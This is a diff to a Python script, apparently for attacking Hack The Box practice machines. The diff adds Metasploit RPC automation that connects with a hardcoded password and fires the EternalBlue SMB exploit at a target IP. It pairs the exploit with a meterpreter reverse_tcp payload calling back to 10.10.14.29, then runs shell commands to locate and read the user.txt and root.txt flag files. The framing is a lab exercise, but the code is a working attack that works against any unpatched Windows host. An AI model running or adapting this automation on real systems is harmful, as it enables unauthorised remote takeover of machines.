@@ -5,6 +5,12 @@ import pandas as pd
 import cve_searchsploit as CS
 import getsploit
 import pyperclip
+import pymetasploit3
+from pymetasploit3 import *
+from pymetasploit3.msfrpc import MsfRpcClient
+
+client = MsfRpcClient('Km9EcHcp', port=55552)
+
 
 parser = argparse.ArgumentParser(description='What box do you want to pwn?')
 parser.add_argument('--box', required=True)
@@ -102,17 +108,17 @@ def workflow():
     #paneVpn.send_keys("")
     cveList = list(dict.fromkeys(cveList))
     exploitList = []
-    for cve in cveList:
-        print(cve)
-        print(CS.edbid_from_cve(cve))
-        for i in CS.edbid_from_cve(cve):
-            os.system("searchsploit -p " + str(i))
-            #print(pyperclip.paste())
-            exploitList.append(pyperclip.paste())
-            time.sleep(5)
-    print(exploitList)
-    for exploit in exploitList:
-        print(exploit)
+    # for cve in cveList:
+    #     print(cve)
+    #     print(CS.edbid_from_cve(cve))
+    #     for i in CS.edbid_from_cve(cve):
+    #         os.system("searchsploit -p " + str(i))
+    #         #print(pyperclip.paste())
+    #         exploitList.append(pyperclip.paste())
+    #         time.sleep(5)
+    # print(exploitList)
+    # for exploit in exploitList:
+    #     print(exploit)
     # with open("exploits.txt", newline='') as exploitfile:
     #     exploits=[]
     #     lines = exploitfile.read().splitlines()
@@ -121,6 +127,32 @@ def workflow():
     #         exploits = re.findall(r'exploits/\w+/w+/$\w+', line)
     #         for exploit in exploits:
     #             print(exploit)
+    #print(client.modules.exploits)
+    exploit = client.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
+    #print(exploit.description)
+    exploit['RHOSTS'] = getBoxIP(name)
+    # print(exploit.required)
+    # print(exploit.runoptions)
+    # print(exploit.references)
+    # print(exploit.targets)
+    # print(exploit.targetpayloads())
+    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+    # print(payload.required)
+    # print(payload.runoptions)
+    payload['LHOST'] = '10.10.14.29'
+    #exploit['DisablePayloadHandler'] = False
+    exploit.execute(payload=payload)
+    print(client.sessions.list)
+    shell = client.sessions.session(list(client.sessions.list.keys())[0])
+    shell.write('whoami')
+    shell.read()
+    print(shell.run_with_output('pwd'))
+    print(shell.run_with_output('search -f user.txt'))
+    print(shell.run_with_output('search -f root.txt'))
+    print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
+    print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
+
+    #shell.run_shell_cmd_with_output('pwd')
     nm = nmap.PortScanner()
     #nm.scan(hosts=getBoxIP(name), arguments='-sC -sV -Pn')
     #nm.scan(hosts=getBoxIP(name), arguments='--script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sC -sV -Pn')
